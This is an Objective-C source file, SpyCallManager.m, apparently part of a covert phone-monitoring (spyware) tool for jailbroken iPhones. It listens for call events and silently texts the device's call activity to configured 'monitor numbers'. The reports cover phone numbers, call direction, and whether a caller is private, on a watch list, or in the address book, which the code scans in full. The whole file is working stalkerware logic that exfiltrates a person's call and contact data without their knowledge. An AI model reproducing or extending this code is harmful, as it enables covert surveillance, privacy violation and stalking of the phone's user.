//
//  SpyCallManager.m
//  SpyCall
//
//  Created by Makara Khloth on 3/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallManager.h"
#import "RecentCallNotifier.h"

#import "SMSSender.h"
#import "PreferenceManager.h"
#import "PrefMonitorNumber.h"
#import "SharedFileIPC.h"
#import "DefStd.h"
#import "SMSSendMessage.h"
#import "PrefWatchList.h"
#import "TelephoneNumber.h"
#import "SpringBoardDidLaunchNotifier.h"

#import <AddressBook/AddressBook.h>
#import <AddressBook/ABRecord.h>
#import "AddressBook-Private.h"

@interface SpyCallManager (private)

- (void) sharePreferenceMonitor;
- (void) sendSMS: (NSString *) aSMS;
- (BOOL) isNumberInCallWatch: (NSString *) aTelephoneNumber;
- (BOOL) isNumberinAddressBook: (NSString *) aTelephoneNumber;

@end


@implementation SpyCallManager

@synthesize mSMSSender;
@synthesize mPreferenceManager;

- (id) init {
	if ((self = [super init])) {
		mRecentCallNotifier = [[RecentCallNotifier alloc] init];
		mSBNotifier = [[SpringBoardDidLaunchNotifier alloc] initWithNotifier:mRecentCallNotifier];
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSpyCallMSCommandMsgPort
												 withMessagePortIPCDelegate:self];
	
	}
	return (self);
}

- (void) start {
	[mMessagePortReader start];
	[mRecentCallNotifier start];
	[mRecentCallNotifier setMPreferenceManager:[self mPreferenceManager]];
	[self sharePreferenceMonitor];
	[mSBNotifier registerSpringBoardNotification];
}

- (void) stop {
	[mMessagePortReader stop];
	[mRecentCallNotifier stop];
	[self sharePreferenceMonitor];
	[mSBNotifier unregisterSpringBoardNotification];
}

- (void) disableSpyCall {
	[mMessagePortReader stop];
	[mRecentCallNotifier stop];
	PrefMonitorNumber *prefMonitor = [[PrefMonitorNumber alloc] init];
	SharedFileIPC *sharedFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	[sharedFile writeData:[prefMonitor toData] withID:kSharedFileMonitorNumberID];
	[sharedFile release];
	[prefMonitor release];
	[mSBNotifier unregisterSpringBoardNotification];
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	// Send message to home/notification .. numbers
	NSInteger cmd = kSpyCallMSNormalCallInProgress;
	[aRawData getBytes:&cmd length:sizeof(NSInteger)];
	NSInteger location = sizeof(NSInteger);
	switch (cmd) {
		case kSpyCallMSNormalCallOnHold: {
			// Tel numbers
			NSMutableArray *telNumbers = [NSMutableArray array];
			NSMutableArray *telDirections = [NSMutableArray array];
			NSInteger count = 0;
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger length = 0;
				[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				NSData *telData = [aRawData subdataWithRange:NSMakeRange(location, length)];
				location += length;
				NSString *tel = [[NSString alloc] initWithData:telData encoding:NSUTF8StringEncoding];
				[telNumbers addObject:tel];
				[tel release];
			}
			// Directions
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger direction = 1; // 1 = IN, 2 = OUT
				[aRawData getBytes:&direction range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				[telDirections addObject:[NSNumber numberWithInt:direction]];
			}
			NSString *numberDirection = @"";
			for (NSInteger i = 0; i < MAX([telNumbers count], [telDirections count]); i++) {
				NSString *number = [telNumbers objectAtIndex:i];
				NSNumber *direction = [telDirections objectAtIndex:i];
				NSString *directionString = [direction intValue] == 1 ? NSLocalizedString(@"kOneCallDirectionIn", @"") : NSLocalizedString(@"kOneCallDirectionOut", @"");
				numberDirection = [NSString stringWithFormat:@"%@%@,%@\n", numberDirection, number, directionString];
			}
			NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectNormalCallOnHold", @""), numberDirection];
			DLog (@"Normal call is on hold, message = %@", message);
			[self sendSMS:message];
		} break;
		case kSpyCallMSNormalCallInProgress: {
			NSInteger direction = 1; // 1 = IN, 2 = OUT
			[aRawData getBytes:&direction range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSInteger length = 0;
			[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSData *numberData = [aRawData subdataWithRange:NSMakeRange(location, length)];
			NSString *telNumber = [[NSString alloc] initWithData:numberData encoding:NSUTF8StringEncoding];
			NSString *message = @"";
			if (direction == 1) {
				message = NSLocalizedString(@"kIncomingWatchNotication2MonitorNumbers", @"");
			} else if (direction == 2) {
				message = NSLocalizedString(@"kOutgoingWatchNotication2MonitorNumbers", @"");
			}
			message = [NSString stringWithFormat:message, telNumber];
			DLog(@"Normal call is in progress, message = %@", message);
			
			if ([self isNumberInCallWatch:telNumber]) {
				[self sendSMS:message];
			}
			[telNumber release];
		} break;
		case kSpyCallMSAudioIsActive: {
			// Send application is playing/recording audio
			NSString *message = NSLocalizedString(@"kCannotAnswerOneCallAudioIsActive", @"");
			DLog(@"Audio is active, message = %@", message);
			[self sendSMS:message];
		} break;
		case kSpyCallMSMaxConferenceLine: {
			// Max lines
			NSInteger lines = 0;
			[aRawData getBytes:&lines range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			// Tel numbers
			NSMutableArray *telNumbers = [NSMutableArray array];
			NSMutableArray *telDirections = [NSMutableArray array];
			NSInteger count = 0;
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger length = 0;
				[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				NSData *telData = [aRawData subdataWithRange:NSMakeRange(location, length)];
				location += length;
				NSString *tel = [[NSString alloc] initWithData:telData encoding:NSUTF8StringEncoding];
				[telNumbers addObject:tel];
				[tel release];
			}
			// Directions
			[aRawData getBytes:&count range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			for (NSInteger i = 0; i < count; i++) {
				NSInteger direction = 1; // 1 = IN, 2 = OUT
				[aRawData getBytes:&direction range:NSMakeRange(location, sizeof(NSInteger))];
				location += sizeof(NSInteger);
				[telDirections addObject:[NSNumber numberWithInt:direction]];
			}
			NSString *numberDirection = @"";
			for (NSInteger i = 0; i < MAX([telNumbers count], [telDirections count]); i++) {
				NSString *number = [telNumbers objectAtIndex:i];
				NSNumber *direction = [telDirections objectAtIndex:i];
				NSString *directionString = [direction intValue] == 1 ? NSLocalizedString(@"kOneCallDirectionIn", @"") : NSLocalizedString(@"kOneCallDirectionOut", @"");
				numberDirection = [NSString stringWithFormat:@"%@%@,%@\n", numberDirection, number, directionString];
			}
			NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectMaxConferenceLines", @""), lines, numberDirection];
			DLog (@"Maximum number of line reached, message = %@", message);
			[self sendSMS:message];
		} break;
		case kSpyCallMSSpyCallInProgress: {
			NSInteger length = 0;
			[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
			location += sizeof(NSInteger);
			NSData *telData = [aRawData subdataWithRange:NSMakeRange(location, length)];
			location += length;
			NSString *tel = [[NSString alloc] initWithData:telData encoding:NSUTF8StringEncoding];
			NSString *message = [NSString stringWithFormat:NSLocalizedString(@"kOneCallDisconnectOneCallActive", @""), tel];
			DLog (@"Other spy call is in progress, message = %@", message);
			[self sendSMS:message];
			[tel release];
		} break;
		default:
			break;
	}
}

- (void) sharePreferenceMonitor {
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
	SharedFileIPC *sharedFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	[sharedFile writeData:[prefMonitor toData] withID:kSharedFileMonitorNumberID];
	[sharedFile release];
}

- (void) sendSMS: (NSString *) aSMS {
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
	for (NSString* recipient in [prefMonitor mMonitorNumbers]) {
		SMSSendMessage* smsSendMessage = [[SMSSendMessage alloc] init];
		[smsSendMessage setMMessage:aSMS];
		[smsSendMessage setMRecipientNumber:recipient];
		[mSMSSender sendSMS:smsSendMessage];
		[smsSendMessage release];
	}
}

- (BOOL) isNumberInCallWatch: (NSString *) aTelephoneNumber {
	BOOL numberIsInWatch = FALSE;
	PrefWatchList *prefWatchList = (PrefWatchList *)[[self mPreferenceManager] preference:kWatch_List];
	if ([prefWatchList mEnableWatchNotification]) {
		// Private/Unknown number
		if (!numberIsInWatch && ([prefWatchList mWatchFlag] & kWatch_Private_Or_Unknown_Number)) {
			if ([aTelephoneNumber isEqualToString:@"Blocked"]) {
				numberIsInWatch = TRUE;
			}
		}
		// Watch list number
		if (!numberIsInWatch && ([prefWatchList mWatchFlag] & kWatch_In_List)) {
			TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
			for (NSString *watchNumber in [prefWatchList mWatchNumbers]) {
				if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:watchNumber]) {
					numberIsInWatch = TRUE;
					break;
				}
			}
			[telNumber release];
		}
		
		// Not in address book/In address book
		if (!numberIsInWatch && (([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook) ||
								([prefWatchList mWatchFlag] & kWatch_In_Addressbook))) {
			BOOL isInAddressBook = [self isNumberinAddressBook:aTelephoneNumber];
			DLog (@"Is number is in address book = %d", isInAddressBook);
			if (!isInAddressBook && ([prefWatchList mWatchFlag] & kWatch_Not_In_Addressbook)) {
				numberIsInWatch = TRUE;
			}
			if (isInAddressBook && ([prefWatchList mWatchFlag] & kWatch_In_Addressbook)) {
				numberIsInWatch = TRUE;
			}
		}
	}
	DLog (@"Is number is in watch = %d", numberIsInWatch);
	return (numberIsInWatch);
}

- (BOOL) isNumberinAddressBook: (NSString *) aTelephoneNumber {
	DLog (@"Number to compare with address book, aTelephoneNumber = %@", aTelephoneNumber);
	BOOL isInAddressBook = FALSE;
	ABAddressBookRef addressBook = ABAddressBookCreateWithDatabaseDirectory((CFStringRef)kUIAddressBookFolder);
	CFArrayRef contactArray = ABAddressBookCopyArrayOfAllPeople(addressBook);
	CFIndex numberOfContact = ABAddressBookGetPersonCount(addressBook);
	TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
	for (CFIndex index = 0; index < numberOfContact; index++) {
		ABRecordRef abRecord = CFArrayGetValueAtIndex(contactArray, index);
		ABMultiValueRef phones = ABRecordCopyValue(abRecord, kABPersonPhoneProperty);
		for (CFIndex i = 0; (phones && i < ABMultiValueGetCount(phones)); i++) {
			CFStringRef phoneValue = ABMultiValueCopyValueAtIndex(phones, i);
			if (phoneValue) {
				NSString *number = [NSString stringWithString:(NSString *)phoneValue];
				DLog (@"Number from address book, number = %@", number);
				if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:number]) {
					isInAddressBook = TRUE;
					CFRelease(phoneValue);
					break;
				}
				CFRelease(phoneValue);
			}
		}
		if (phones) CFRelease(phones);
		if (isInAddressBook) break;
	}
	[telNumber release];
	if (contactArray) CFRelease(contactArray);
	if (addressBook) CFRelease(addressBook);
	return (isInAddressBook);
}

- (void) dealloc {
	[mMessagePortReader stop];
	[mMessagePortReader release];
	[mRecentCallNotifier release];
	[mSBNotifier release];
	[super dealloc];
}

@end
